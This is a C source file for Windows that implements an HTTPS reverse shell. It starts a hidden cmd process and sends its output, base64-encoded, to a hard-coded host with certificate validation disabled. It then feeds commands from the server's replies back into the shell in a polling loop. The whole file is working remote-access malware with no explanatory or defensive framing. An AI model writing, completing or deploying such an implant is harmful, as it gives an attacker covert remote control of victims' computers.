#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdio.h>

char *base64_encode_winapi(const BYTE *data, DWORD data_len) {
    DWORD out_len = 0;

    // First call gets required output length
    if (!CryptBinaryToStringA(
            data,
            data_len,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            NULL,
            &out_len
        )) {
        return NULL;
    }

    char *out = malloc(out_len);
    if (!out) {
        return NULL;
    }

    if (!CryptBinaryToStringA(
            data,
            data_len,
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            out,
            &out_len
        )) {
        free(out);
        return NULL;
    }

    return out;
}

int main(void) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(
        L"MyHttpClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        printf("WinHttpOpen failed: %lu\n", GetLastError());
        return 1;
    }

    hConnect = WinHttpConnect(
        hSession,
        L"192.168.1.50",
        443,
        0
    );

    if (!hConnect) {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 1;
    }

    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE childStdoutRead = NULL;
    HANDLE childStdoutWrite = NULL;

    HANDLE childStdinRead = NULL;
    HANDLE childStdinWrite = NULL;

    if (!CreatePipe(&childStdoutRead, &childStdoutWrite, &sa, 0)) {
        printf("CreatePipe stdout failed: %lu\n", GetLastError());
        return 1;
    }


    if (!CreatePipe(&childStdinRead, &childStdinWrite, &sa, 0)) {
        printf("CreatePipe stdout failed: %lu\n", GetLastError());
        return 1;
    }

    /*
      Important: parent-side read handle should not be inherited
      by the child.
    */
    SetHandleInformation(childStdoutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA sinfo;
    ZeroMemory(&sinfo, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdOutput = childStdoutWrite;
    sinfo.hStdError  = childStdoutWrite;
    sinfo.hStdInput  = childStdinRead;

    PROCESS_INFORMATION pinfo;
    ZeroMemory(&pinfo, sizeof(pinfo));

    char cmdline[] = "cmd";

    BOOL ok = CreateProcessA(
        NULL,
        cmdline,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &sinfo,
        &pinfo
    );

    /*
      Parent must close its copy of the write end,
      otherwise ReadFile may wait forever.
    */
    CloseHandle(childStdoutWrite);

    if (!ok) {
        printf("CreateProcessA failed: %lu\n", GetLastError());
        CloseHandle(childStdoutRead);
        return 1;
    }

    char response[1024];
    while(1){

        hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            L"/",
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE
        );

        if (!hRequest) {
            printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return 1;
        }


        DWORD flags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if (!WinHttpSetOption(
                hRequest,
                WINHTTP_OPTION_SECURITY_FLAGS,
                &flags,
                sizeof(flags)
            )) {
            printf("WinHttpSetOption failed: %lu\n", GetLastError());
        }

        char body[2050];
        DWORD bytesAvailable = 0;

        BOOL hasData = PeekNamedPipe(
            childStdoutRead,   // extremo de lectura del padre
            NULL,
            0,
            NULL,
            &bytesAvailable,
            NULL
        );
        if (bytesAvailable > 0) {
            char buffer[2001];
            DWORD toRead = bytesAvailable > 2000 ? 2000 : bytesAvailable;
            DWORD bytesRead = 0;

            ZeroMemory(buffer, sizeof(buffer));

            ReadFile(childStdoutRead, buffer, toRead, &bytesRead, NULL);
            buffer[bytesRead] = '\0';
            char *b64 = base64_encode_winapi(
                    (const BYTE *)buffer,
                    (DWORD)strlen(buffer)
                );
            snprintf(body, 2050, "{\"message\":\"%s\"}", b64);
        }
        DWORD bodyLen = (DWORD)strlen(body);

        LPCWSTR headers = L"Content-Type: application/json\r\n";

        BOOL ok = WinHttpSendRequest(
            hRequest,
            headers,
            (DWORD)-1L,
            (LPVOID)body,
            bodyLen,
            bodyLen,
            0
        );

        if (!ok || !WinHttpReceiveResponse(hRequest, NULL)) {
            printf("HTTP request failed: %lu\n", GetLastError());
        } else {
            DWORD size = 0;

            do {
                DWORD downloaded = 0;

                if (!WinHttpQueryDataAvailable(hRequest, &size))
                    break;

                if (size == 0)
                    break;

                ZeroMemory(response, sizeof(response));

                if (size > sizeof(response) - 1) {
                    size = sizeof(response) - 1;
                }

                WinHttpReadData(hRequest, response, size, &downloaded);
                response[downloaded] = '\0';
                WriteFile(childStdinWrite, response, downloaded, NULL, NULL);

            } while (size > 0);
        }

        WinHttpCloseHandle(hRequest);
        Sleep(1000);
    }

    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}